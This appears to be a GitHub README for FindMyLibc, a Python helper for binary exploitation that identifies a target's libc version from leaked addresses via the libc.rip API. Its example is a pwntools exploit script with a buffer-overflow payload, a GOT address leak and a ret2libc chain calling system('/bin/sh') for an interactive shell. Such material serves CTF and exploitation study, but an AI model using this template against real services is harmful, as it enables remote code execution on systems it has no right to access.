# FindMyLibc
You're exploiting a binary, you've found an address leak, now you need the libc version  
and most importantly, the addresses of symbols like `system` and `str_bin_sh`.

**This tool is the easiest to setup & use!**  
The shortest path to victory 🏆

## Disclaimer
This was tested only on 32-bit binary, so it might not work properly on 64-bit binaries.  
Would be updated!

# Setup
Download this repo:  
```
git clone https://github.com/omrina/FindMyLibc.git
```  
Then just import:  
```
from FindMyLibc import *
```    
And use the only function you need:
```
matching_libc = find_libc(elf, leak_libc_address)
```  

See below the example.

# Example
Here's a simple example of exploit script (see [`./example.py`](https://github.com/omrina/FindMyLibc/blob/main/example.py)).

### Setup your binary exploit script:
Whatever you need...
```
from pwn import *
from FindMyLibc import *

# Setup your binary
elf = ELF("./elf_name")
host = args.HOST or 'localhost'
port = int(args.PORT or 5555)
io = connect(host, port)
```

### We need to set up a "leak address" function:

```
# Payload until right before the return address
payload = b'A' * 512 + b'BBBBCCCCDDDD'

# Example function that gets a symbol name and leaks its address from the binary
def leak_libc_address(symbol_name):
    libc_symbol_address = elf.got[symbol_name]
    puts = elf.symbols["puts"]

    io.recvline()
    io.send(payload + p32(puts) + p32(libc_symbol_address))
    received = io.recv()

    return u64(received.ljust(8, b"\x00"))
```
### Now the real deal:
```
# call `find_libc`, it returns a list of matching libc candidates.
matching_libc = find_libc(elf, leak_libc_address)
chosen_libc = matching_libc[0]

# Each libc candidate comes with the attribute of `base_address`
print("libc base_address at: %s " % hex(chosen_libc['base_address']))

# Everything you need is probably in `syms`,
# a dictionary of ALL the libc symbols: {symbol: calculated_address}
binsh_address = chosen_libc['syms']['str_bin_sh']
system_address = chosen_libc['syms']['system']
print("/bin/sh at: %s" % hex(binsh_address))
print("system at: %s " % hex(system_address))
```

The output from `./example.py`:

![image](https://github.com/user-attachments/assets/dfd95d72-e202-4d59-9e44-fcfd4d01eccd)


What is `chosen_lib`:

![image](https://github.com/user-attachments/assets/06ff78eb-f59b-4ba6-b199-079e0e091781)

### How do we use the results:
You would probably need only `syms`, each value is the integer of the calcualted address, so you can use it like:
```
shell_rop = p32(system_address) + b'EEEE' + p32(binsh_address)
io.send(payload + shell_rop)
io.interactive()
```

# How does it work?
The finder leaks the address of common symbols:  
`_common_symbols_to_leak = ['__libc_start_main', 'puts', 'printf', 'gets', 'read', 'write', 'send', 'recv']`  
Then it makes reqeusts to the public `https://libc.rip/api/find'`, with different combination of leaked symbols every time.  

E.g.- we send a request with `{'puts': 'leaked-address-of-puts', 'gets': 'leaked-address-of-gets'}`.  
A response would be a list of matching libc versions metadata (each item is like a part of `chosen_lib` seen earlier).

## The `stop_libs_amount` argument
The `find_libc` function has a `stop_libs_amount` argument with default of `3`,  
meaning- if we reach 3 matching libc versions, it's enough and we stop searching.  

You can change it if you'd like to:  
`matching_libc = find_libc(elf, leak_libc_address, stop_libs_amount=2)`


